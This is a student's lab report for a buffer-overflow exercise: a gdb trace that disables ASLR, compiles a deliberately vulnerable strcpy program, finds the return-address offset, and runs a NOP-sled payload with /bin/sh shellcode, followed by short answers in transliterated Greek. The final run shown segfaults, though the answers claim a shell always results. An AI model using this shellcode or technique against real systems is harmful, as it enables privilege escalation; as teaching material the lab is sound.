Melakis Nikolaos TP4726
3rd Lab Exe


Execution Trace
-----------------------------------------------------------------------------------------------------

melakis@melakis-VirtualBox:~$ cd Desktop/buffer-overflow-exploit-master/
melakis@melakis-VirtualBox:~/Desktop/buffer-overflow-exploit-master$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
[sudo] password for melakis:        
0
melakis@melakis-VirtualBox:~/Desktop/buffer-overflow-exploit-master$ gcc vuln.c -o vuln -fno-stack-protector -z execstack -no-pie
melakis@melakis-VirtualBox:~/Desktop/buffer-overflow-exploit-master$ ls
README.md  screenshots  vuln  vuln.c
melakis@melakis-VirtualBox:~/Desktop/buffer-overflow-exploit-master$ make vuln
make: 'vuln' is up to date.
melakis@melakis-VirtualBox:~/Desktop/buffer-overflow-exploit-master$ gdb vuln
GNU gdb (Ubuntu 12.1-0ubuntu1~22.04) 12.1
Copyright (C) 2022 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from vuln...
(No debugging symbols found in vuln)
(gdb) disas main
Dump of assembler code for function main:
   0x0000000000401156 <+0>:	endbr64 
   0x000000000040115a <+4>:	push   %rbp
   0x000000000040115b <+5>:	mov    %rsp,%rbp
   0x000000000040115e <+8>:	sub    $0x110,%rsp
   0x0000000000401165 <+15>:	mov    %edi,-0x104(%rbp)
   0x000000000040116b <+21>:	mov    %rsi,-0x110(%rbp)
   0x0000000000401172 <+28>:	mov    -0x110(%rbp),%rax
   0x0000000000401179 <+35>:	add    $0x8,%rax
   0x000000000040117d <+39>:	mov    (%rax),%rdx
   0x0000000000401180 <+42>:	lea    -0x100(%rbp),%rax
   0x0000000000401187 <+49>:	mov    %rdx,%rsi
   0x000000000040118a <+52>:	mov    %rax,%rdi
   0x000000000040118d <+55>:	call   0x401050 <strcpy@plt>
   0x0000000000401192 <+60>:	lea    -0x100(%rbp),%rax
   0x0000000000401199 <+67>:	mov    %rax,%rdi
   0x000000000040119c <+70>:	call   0x401060 <puts@plt>
   0x00000000004011a1 <+75>:	mov    $0x0,%eax
   0x00000000004011a6 <+80>:	leave  
   0x00000000004011a7 <+81>:	ret    
End of assembler dump.
(gdb) b*0x0000000000401199
Breakpoint 1 at 0x401199
(gdb) run $(python3 -c "print('A' * 230)")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/melakis/Desktop/buffer-overflow-exploit-master/vuln $(python3 -c "print('A' * 230)")
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x0000000000401199 in main ()
(gdb) x/200xb $sp
0x7fffffffdbe0:	0x08	0xde	0xff	0xff	0xff	0x7f	0x00	0x00
0x7fffffffdbe8:	0x40	0x00	0x00	0x00	0x02	0x00	0x00	0x00
0x7fffffffdbf0:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffdbf8:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffdc00:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffdc08:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffdc10:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffdc18:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffdc20:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffdc28:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffdc30:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffdc38:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffdc40:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffdc48:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffdc50:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffdc58:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffdc60:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffdc68:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffdc70:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffdc78:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffdc80:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffdc88:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffdc90:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
--Type <RET> for more, q to quit, c to continue without paging--c
0x7fffffffdc98:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffdca0:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
(gdb) delete
Delete all breakpoints? (y or n) y
(gdb) run $(python3 -c "print('A' * 230)")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/melakis/Desktop/buffer-overflow-exploit-master/vuln $(python3 -c "print('A' * 230)")
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[Inferior 1 (process 2962) exited normally]
(gdb) run $(python3 -c "print('A' * 260)")
Starting program: /home/melakis/Desktop/buffer-overflow-exploit-master/vuln $(python3 -c "print('A' * 260)")
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[Inferior 1 (process 2966) exited normally]
(gdb) run $(python3 -c "print('A' * 264)")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/melakis/Desktop/buffer-overflow-exploit-master/vuln $(python3 -c "print('A' * 264)")
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x0000000000000000 in ?? ()
(gdb) run $(python3 -c "print('A' * 270)")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/melakis/Desktop/buffer-overflow-exploit-master/vuln $(python3 -c "print('A' * 270)")
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x0000414141414141 in ?? ()
(gdb) run $(python3 -c "print('\x90' * 224 + '\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68' + '\xf0\xdb\xff\xff\xff\xff\xf7')")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/melakis/Desktop/buffer-overflow-exploit-master/vuln $(python3 -c "print('\x90' * 224 + '\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68' + '\xf0\xdb\xff\xff\xff\xff\xf7')")
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
ë[1ÀC	[       C S
                 °KÍèåÿÿÿ/bin/shðÛÿÿÿÿ÷

Program received signal SIGSEGV, Segmentation fault.
0x00000000004011a7 in main ()
(gdb) disas main
Dump of assembler code for function main:
   0x0000000000401156 <+0>:	endbr64 
   0x000000000040115a <+4>:	push   %rbp
   0x000000000040115b <+5>:	mov    %rsp,%rbp
   0x000000000040115e <+8>:	sub    $0x110,%rsp
   0x0000000000401165 <+15>:	mov    %edi,-0x104(%rbp)
   0x000000000040116b <+21>:	mov    %rsi,-0x110(%rbp)
   0x0000000000401172 <+28>:	mov    -0x110(%rbp),%rax
   0x0000000000401179 <+35>:	add    $0x8,%rax
   0x000000000040117d <+39>:	mov    (%rax),%rdx
   0x0000000000401180 <+42>:	lea    -0x100(%rbp),%rax
   0x0000000000401187 <+49>:	mov    %rdx,%rsi
   0x000000000040118a <+52>:	mov    %rax,%rdi
   0x000000000040118d <+55>:	call   0x401050 <strcpy@plt>
   0x0000000000401192 <+60>:	lea    -0x100(%rbp),%rax
   0x0000000000401199 <+67>:	mov    %rax,%rdi
   0x000000000040119c <+70>:	call   0x401060 <puts@plt>
   0x00000000004011a1 <+75>:	mov    $0x0,%eax
   0x00000000004011a6 <+80>:	leave  
=> 0x00000000004011a7 <+81>:	ret    
End of assembler dump.

-----------------------------------------------------------------------------------------------------

Questions 

1) Me the methodo pou akolouthisa sthn ylopoihsh mou, to apotelesma odhgeite panta se shell, auto ginetai giath h timh epistrofhs tou kwdika epistrefei kapou mesa ston buffer kai me to "no op sled" odhgoumaste se shell.

2) Sth synexeia meta to epityxes overflow to arxeio vuln ginetai kokkino pou shmainei pws einai SUID root. Dhladh otan ektelestei tha trexei me elevated privileges. Pou shmnainei oti den tha exei kai thn kalyterh asfaleia. Proypotheseis einai pws to buffer overflow htan epityxes kai akribws sta swsta shmeia me to swsto buffer size.

-----------------------------------------------------------------------------------------------------
